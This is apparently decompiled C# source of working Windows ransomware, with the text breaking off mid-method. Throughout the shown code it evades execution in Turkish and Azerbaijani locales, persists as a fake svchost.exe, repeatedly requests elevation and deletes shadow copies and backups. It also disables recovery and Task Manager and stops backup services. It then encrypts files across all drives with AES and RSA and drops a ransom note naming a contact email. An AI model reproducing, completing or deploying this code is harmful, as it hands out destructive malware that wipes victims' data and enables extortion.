using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_me.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail: imboutokum@proton.me (In case of no answer in 24 hours check your spam folder)",
		"", "2) There is a reason you got hacked, convince me you don't deserve this (After that we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>q3Sl5AyV57/IHtLGXqZLeCKx8ZkI3U2gnGMCQpH2psofOdnybq/Ng96wmMMNVgYYmzflo15Wtbkg8NTF/HuSrR0QtibhF700b+1fnW2c44VR8D4Ck0eP4DDyf7mO7LZKK1Iw6v5qfpcuCxSngtRszRQG2GetIiLheiHl9c8au0x57S/1CRLcMnXKHKw8E2CUKVRGcZiYWnlJ2osP7B7YiwK9T1nclMzvG53GSJ91+vHf7O3+L19vdrb7SXZEG+hWlvB91u1T4azAl7tGOMuO1mEyJnnqnEdhq/OJ9d1NbeF1l9iqEwhU40p5zFh25PV+qW2qIy/TIK3rDl1UmeWLKQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
